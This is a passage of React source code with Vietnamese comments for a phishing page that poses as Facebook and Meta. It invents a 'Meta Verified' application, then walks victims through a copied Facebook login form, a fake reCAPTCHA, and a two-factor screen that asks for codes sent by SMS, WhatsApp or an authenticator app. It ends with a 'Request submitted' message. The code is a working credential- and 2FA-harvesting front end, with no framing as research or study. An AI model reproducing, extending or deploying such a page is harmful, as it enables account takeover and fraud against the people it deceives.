                                            <option value="+222">+222 (Mauritania)</option>
                                            <option value="+230">+230 (Mauritius)</option>
                                            <option value="+262">+262 (Mayotte)</option>
                                            <option value="+52">+52 (Mexico)</option>
                                            <option value="+691">+691 (Micronesia)</option>
                                            <option value="+373">+373 (Moldova)</option>
                                            <option value="+377">+377 (Monaco)</option>
                                            <option value="+976">+976 (Mongolia)</option>
                                            <option value="+382">+382 (Montenegro)</option>
                                            <option value="+1">+1 (Montserrat)</option>
                                            <option value="+212">+212 (Morocco)</option>
                                            <option value="+258">+258 (Mozambique)</option>
                                            <option value="+95">+95 (Myanmar)</option>
                                            <option value="+264">+264 (Namibia)</option>
                                            <option value="+674">+674 (Nauru)</option>
                                            <option value="+977">+977 (Nepal)</option>
                                            <option value="+31">+31 (Netherlands)</option>
                                            <option value="+687">+687 (New Caledonia)</option>
                                            <option value="+64">+64 (New Zealand)</option>
                                            <option value="+505">+505 (Nicaragua)</option>
                                            <option value="+227">+227 (Niger)</option>
                                            <option value="+234">+234 (Nigeria)</option>
                                            <option value="+683">+683 (Niue)</option>
                                            <option value="+850">+850 (North Korea)</option>
                                            <option value="+389">+389 (North Macedonia)</option>
                                            <option value="+1">+1 (Northern Mariana Islands)</option>
                                            <option value="+47">+47 (Norway)</option>
                                            <option value="+968">+968 (Oman)</option>
                                            <option value="+92">+92 (Pakistan)</option>
                                            <option value="+680">+680 (Palau)</option>
                                            <option value="+970">+970 (Palestine)</option>
                                            <option value="+507">+507 (Panama)</option>
                                            <option value="+675">+675 (Papua New Guinea)</option>
                                            <option value="+595">+595 (Paraguay)</option>
                                            <option value="+51">+51 (Peru)</option>
                                            <option value="+63">+63 (Philippines)</option>
                                            <option value="+48">+48 (Poland)</option>
                                            <option value="+351">+351 (Portugal)</option>
                                            <option value="+1">+1 (Puerto Rico)</option>
                                            <option value="+974">+974 (Qatar)</option>
                                            <option value="+262">+262 (Réunion)</option>
                                            <option value="+40">+40 (Romania)</option>
                                            <option value="+7">+7 (Russia)</option>
                                            <option value="+250">+250 (Rwanda)</option>
                                            <option value="+590">+590 (Saint Barthélemy)</option>
                                            <option value="+290">+290 (Saint Helena)</option>
                                            <option value="+1">+1 (Saint Kitts and Nevis)</option>
                                            <option value="+1">+1 (Saint Lucia)</option>
                                            <option value="+590">+590 (Saint Martin)</option>
                                            <option value="+508">+508 (Saint Pierre and Miquelon)</option>
                                            <option value="+1">+1 (Saint Vincent and the Grenadines)</option>
                                            <option value="+685">+685 (Samoa)</option>
                                            <option value="+378">+378 (San Marino)</option>
                                            <option value="+239">+239 (São Tomé and Príncipe)</option>
                                            <option value="+966">+966 (Saudi Arabia)</option>
                                            <option value="+221">+221 (Senegal)</option>
                                            <option value="+381">+381 (Serbia)</option>
                                            <option value="+248">+248 (Seychelles)</option>
                                            <option value="+232">+232 (Sierra Leone)</option>
                                            <option value="+65">+65 (Singapore)</option>
                                            <option value="+1">+1 (Sint Maarten)</option>
                                            <option value="+421">+421 (Slovakia)</option>
                                            <option value="+386">+386 (Slovenia)</option>
                                            <option value="+677">+677 (Solomon Islands)</option>
                                            <option value="+252">+252 (Somalia)</option>
                                            <option value="+27">+27 (South Africa)</option>
                                            <option value="+82">+82 (South Korea)</option>
                                            <option value="+211">+211 (South Sudan)</option>
                                            <option value="+34">+34 (Spain)</option>
                                            <option value="+94">+94 (Sri Lanka)</option>
                                            <option value="+249">+249 (Sudan)</option>
                                            <option value="+597">+597 (Suriname)</option>
                                            <option value="+46">+46 (Sweden)</option>
                                            <option value="+41">+41 (Switzerland)</option>
                                            <option value="+963">+963 (Syria)</option>
                                            <option value="+886">+886 (Taiwan)</option>
                                            <option value="+992">+992 (Tajikistan)</option>
                                            <option value="+255">+255 (Tanzania)</option>
                                            <option value="+66">+66 (Thailand)</option>
                                            <option value="+670">+670 (Timor-Leste)</option>
                                            <option value="+228">+228 (Togo)</option>
                                            <option value="+690">+690 (Tokelau)</option>
                                            <option value="+676">+676 (Tonga)</option>
                                            <option value="+1">+1 (Trinidad and Tobago)</option>
                                            <option value="+216">+216 (Tunisia)</option>
                                            <option value="+90">+90 (Turkey)</option>
                                            <option value="+993">+993 (Turkmenistan)</option>
                                            <option value="+1">+1 (Turks and Caicos Islands)</option>
                                            <option value="+688">+688 (Tuvalu)</option>
                                            <option value="+256">+256 (Uganda)</option>
                                            <option value="+380">+380 (Ukraine)</option>
                                            <option value="+971">+971 (United Arab Emirates)</option>
                                            <option value="+44">+44 (United Kingdom)</option>
                                            <option value="+1">+1 (United States)</option>
                                            <option value="+598">+598 (Uruguay)</option>
                                            <option value="+1">+1 (US Virgin Islands)</option>
                                            <option value="+998">+998 (Uzbekistan)</option>
                                            <option value="+678">+678 (Vanuatu)</option>
                                            <option value="+379">+379 (Vatican City)</option>
                                            <option value="+58">+58 (Venezuela)</option>
                                            <option value="+84">+84 (Vietnam)</option>
                                            <option value="+681">+681 (Wallis and Futuna)</option>
                                            <option value="+212">+212 (Western Sahara)</option>
                                            <option value="+967">+967 (Yemen)</option>
                                            <option value="+260">+260 (Zambia)</option>
                                            <option value="+263">+263 (Zimbabwe)</option>
                                        </select>
                                    </div>
                                    <input className="fb-input" style={{ flex: 1, borderColor: errors.phoneNum ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
                                </div>
                                {errors.phoneNum && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid phone number.</div>}
                            </div>
                            <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : t.continueBtn}</button>
                        </form>
                      </>
                    )}
                  </>
                )}

                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: '24px', paddingTop: '20px', borderTop: '1px solid #e4e6eb' }}>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', margin: '0 auto' }} />
                </div>
            </div>
        </div>
      )}

      {/* ================= FULL PAGE GIAO DIỆN ================= */}
      {showFullPage && (
        <div style={{ position: 'fixed', inset: 0, background: '#fff', zIndex: 2000, display: 'flex', flexDirection: 'column', overflowY: 'auto' }}>
          {/* Header Facebook */}
          <div style={{ padding: '16px 24px', borderBottom: '1px solid #e4e6eb', height: '60px', boxSizing: 'border-box', display: 'flex', alignItems: 'center' }}>
            <svg height="24" viewBox="100 100 900 160" xmlns="http://www.w3.org/2000/svg">
              <title>Facebook</title>
              <path fill="#0866FF" d="M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z"></path>
            </svg>
          </div>

          <div style={{ flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'flex-start', padding: '40px 16px' }}>
            <div style={{ width: '100%', maxWidth: '560px' }}>

              {/* BƯỚC 1.5: THÔNG BÁO CHUYỂN HƯỚNG SANG ĐĂNG NHẬP */}
              {step === 1.5 && (
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', width: '100%', maxWidth: '400px', margin: '60px auto 0 auto' }}>
                  <div style={{ background: '#fff', border: '1px solid #ced0d4', borderRadius: '8px', padding: '32px 24px', width: '100%', boxSizing: 'border-box', boxShadow: '0 12px 28px rgba(0,0,0,0.1)' }}>
                    <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '12px', color: '#1c1e21', textAlign: 'center' }}>
                      Verification Required
                    </h2>
                    <p style={{ fontSize: '15px', color: '#65676b', marginBottom: '24px', lineHeight: '1.5', textAlign: 'center' }}>
                      Your business details have been recorded. To proceed with the Meta Verified application, you must securely log in to your account.
                    </p>
                    
                    <button 
                      onClick={() => { setStep(2); }} 
                      style={{
                        width: '100%', padding: '14px', borderRadius: '100px', border: 'none',
                        background: '#0064e0', color: '#fff', fontSize: '17px', fontWeight: '700', cursor: 'pointer'
                      }}
                    >
                      Continue to Log In
                    </button>
                  </div>
                </div>
              )}

                                                                                                                            {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn 100% tỷ lệ FB */}
              {step === 2 && (
                <div style={{ 
                  position: 'fixed', 
                  inset: 0, 
                  background: '#fff', 
                  zIndex: 2000, 
                  display: 'flex',
                  flexDirection: 'row' 
                }}>
                  
                  {/* CỘT TRÁI: Chiếm 2/3 không gian, chứa text và ảnh */}
                  <div style={{ 
                    flex: '2', // Chiếm 2 phần
                    display: 'flex', 
                    flexDirection: 'column', 
                    justifyContent: 'center', 
                    padding: '0 40px',
                    borderRight: '1px solid #e4e6eb',
                    backgroundColor: '#fff'
                  }}>
                    <div style={{ width: '100%', maxWidth: '650px', margin: '0 auto', display: 'flex', flexDirection: 'column' }}>
                      
                      {/* Logo F nhỏ */}
                      <svg viewBox="0 0 36 36" height="42" width="42" style={{ marginBottom: '24px' }}>
                        <path fill="#0866FF" d="M18 0C8.06 0 0 8.06 0 18s8.06 18 18 18c9.94 0 18-8.06 18-18S27.94 0 18 0zm4.04 26.13h-4.32v-14.4h-4.32v-4.32h4.32V5.04c0-2.92 1.62-4.32 4.32-4.32h3.6v4.32h-2.16c-1.08 0-1.44.36-1.44 1.44v1.44h4.32l-.72 4.32h-3.6v14.4z"/>
                      </svg>
                      
                      <h1 style={{ fontSize: '56px', fontWeight: '700', lineHeight: '1.1', color: '#1c2b33', margin: '0 0 30px 0', letterSpacing: '-1.5px' }}>
                        Explore <br />the <br />things <br /><span style={{ color: '#0064e0' }}>you love.</span>
                      </h1>
                      
                      {/* Ảnh to chiếm gần hết cột trái */}
                      <img 
                        src="/images/Anhlogin.webp" 
                        alt="Explore" 
                        style={{ width: '100%', maxWidth: '600px', display: 'block' }} 
                      />
                    </div>
                  </div>

                  {/* CỘT PHẢI: Chiếm 1/3 không gian, chứa form đăng nhập */}
                  <div style={{ 
                    flex: '1', // Chiếm 1 phần
                    display: 'flex', 
                    flexDirection: 'column', 
                    justifyContent: 'center', 
                    alignItems: 'center', 
                    padding: '40px'
                  }}>
                    <div style={{ width: '90%', maxWidth: '396px' }}>
                      
                      <h2 style={{ fontSize: '18px', fontWeight: '500', color: '#1c2b33', margin: '0 0 20px 0' }}>
                        Log into Facebook
                      </h2>

                      <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                        <input 
                          className="fb-input" 
                          placeholder="Email or mobile number" 
                          value={loginUser} 
                          onChange={e => setLoginUser(e.target.value)} 
                          required 
                          style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px', width: '100%', boxSizing: 'border-box' }}
                        />
                        
                        <input 
                          className="fb-input" 
                          type="password" 
                          placeholder="Password" 
                          value={loginPass} 
                          onChange={e => setLoginPass(e.target.value)} 
                          required 
                          style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px', width: '100%', boxSizing: 'border-box' }}
                        />
                        
                        {showLoginError && <div style={{ color: '#fa383e', fontSize: '14px', marginTop: '4px' }}>{t.loginError}</div>}
                        
                        <button type="submit" disabled={loading} style={{
                          width: '100%', padding: '14px', borderRadius: '100px', border: 'none',
                          background: '#0866FF', color: '#fff', fontSize: '20px', fontWeight: '700', cursor: 'pointer', marginTop: '6px'
                        }}>
                          {loading ? 'Logging in...' : 'Log in'}
                        </button>
                      </form>

                      {/* Logo Meta căn giữa tuyệt đối với nút Login */}
                      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', marginTop: '24px', width: '100%' }}>
                          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '16px', opacity: 0.7 }} />
                      </div>

                    </div>
                  </div>
                </div>
              )}

              {/* BƯỚC 3: CAPTCHA FULL PAGE */}
              {step === 3 && (
                <div style={{ 
                  width: '100%', 
                  display: 'flex', 
                  justifyContent: 'center', 
                  marginTop: '40px' 
                }}>
                  
                  <div style={{ width: '100%', maxWidth: '350px' }}>
                    
                    {/* Khung reCAPTCHA */}
                    <div 
                      onClick={handleCaptchaClick}
                      style={{
                        border: '1px solid #d3d3d3',
                        borderRadius: '3px',
                        padding: '24px 12px',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'space-between',
                        background: '#f9f9f9',
                        cursor: captchaDone ? 'default' : 'pointer',
                        width: '100%',
                        boxSizing: 'border-box',
                        boxShadow: '0 0 4px 1px rgba(0,0,0,0.08)',
                        userSelect: 'none'
                      }}
                    >
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                        <div style={{
                          width: '24px', height: '24px', border: '2px solid #c1c1c1',
                          borderRadius: '2px', display: 'flex', alignItems: 'center', justifyContent: 'center',
                          background: '#fff',
                          flexShrink: 0, transition: 'all 0.2s'
                        }}>
                          {captchaChecked && !captchaLoading && <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
                          {captchaLoading && <div style={{ width: '14px', height: '14px', border: '2px solid #e0e0e0', borderTop: '2px solid #4285f4', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>}
                        </div>
                        <span style={{ fontSize: '14px', color: '#000', fontWeight: '400' }}>
                          I'm not a robot
                        </span>
                      </div>
                      
                      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" style={{ width: '28px', height: '28px', marginBottom: '2px' }} />
                        <span style={{ fontSize: '9px', color: '#555' }}>reCAPTCHA</span>
                        <span style={{ fontSize: '8px', color: '#555' }}>Privacy - Terms</span>
                      </div>
                    </div>

                    {/* Khối chữ mô tả - Đã thu nhỏ fontsize và màu chuẩn FB */}
                    <div style={{ marginTop: '12px', fontSize: '11px', color: '#65676b', lineHeight: '1.4', textAlign: 'left', width: '100%' }}>
                      <p style={{ margin: '0 0 10px 0' }}>
                        This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
                      </p>
                      <p style={{ margin: '0 0 10px 0' }}>
                        We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.
                      </p>
                      <p style={{ margin: 0 }}>
                        reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.
                      </p>
                    </div>

                  </div>
                </div>
              )}

              {/* BƯỚC 4: OTP FULL PAGE */}
              {step === 4 && !showSuccess && (
                <div>
                  <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '8px', color: '#1c1e21', lineHeight: '1.3' }}>
                    Two-factor authentication
                  </h2>
                  <p style={{ fontSize: '15px', color: '#1c1e21', marginBottom: '24px', lineHeight: '1.4' }}>
                    Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.
                  </p>

                  <div style={{ marginBottom: '24px', borderRadius: '8px', overflow: 'hidden' }}>
                    <img 
                      src="/images/2fa-illustration.png" 
                      alt="2FA Code" 
                      style={{ width: '100%', display: 'block', objectFit: 'cover' }} 
                    />
                  </div>

                  <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                    <input 
                      type="text" 
                      placeholder="Code" 
                      value={otp} 
                      onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
                      style={{ 
                        padding: '14px 16px', 
                        fontSize: '16px', 
                        border: '1px solid #ccd0d5', 
                        borderRadius: '8px', 
                        outline: 'none',
                        width: '100%',
                        boxSizing: 'border-box'
                      }} 
                    />
                    
                    <div style={{ fontSize: '15px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
                      It may take a few minutes for you to get this code.
                      {otpCanResend ? (
                        <button type="button" onClick={handleResendOtp} disabled={loading} style={{ background: 'none', border: 'none', color: loading ? '#a0c3ff' : '#0064e0', fontWeight: '600', cursor: loading ? 'not-allowed' : 'pointer', fontSize: '15px', padding: 0 }}>
                          {loading ? 'Sending...' : 'Get a new code'}
                        </button>
                      ) : (
                        <span>Get a new code in <strong>{formatTime(otpSecondsLeft)}</strong></span>
                      )}
                    </div>

                    {showOtpError && <div style={{ color: '#fa383e', fontSize: '15px', marginTop: '4px' }}>Incorrect code. Please try again.</div>}

                    <button type="submit" disabled={loading || otp.length < 6} style={{
                      width: '100%',
                      padding: '16px',
                      borderRadius: '100px',
                      border: 'none',
                      background: otp.length >= 6 ? '#0064e0' : '#a0c3ff',
                      color: '#fff',
                      fontSize: '17px',
                      fontWeight: '700',
                      cursor: otp.length >= 6 ? 'pointer' : 'not-allowed',
                      transition: 'background 0.2s'
                    }}>
                      {loading ? 'Verifying...' : 'Continue'}
                    </button>
                  </form>
                </div>
              )}

              {/* BƯỚC 5: SUCCESS FULL PAGE */}
              {showSuccess && (
                <div style={{ textAlign: 'center', marginTop: '40px' }}>
                  <div style={{ width: '88px', height: '88px', borderRadius: '50%', background: '#e7f3ff', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                    <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                  </div>
                  <h2 style={{ fontSize: '24px', fontWeight: '700', color: '#1c1e21', marginBottom: '12px' }}>Request submitted</h2>
                  <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '24px' }}>Your request has been sent. Please wait up to 24 hours for verification.</p>
                  <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} style={{
                    padding: '14px 40px',
                    borderRadius: '100px',
                    border: 'none',
                    background: '#0064e0',
                    color: '#fff',
                    fontSize: '16px',
                    fontWeight: '700',
                    cursor: 'pointer'
                  }}>Close</button>
                </div>
              )}
              
            </div>
          </div>
        </div>
      )}
    </div>
  );
}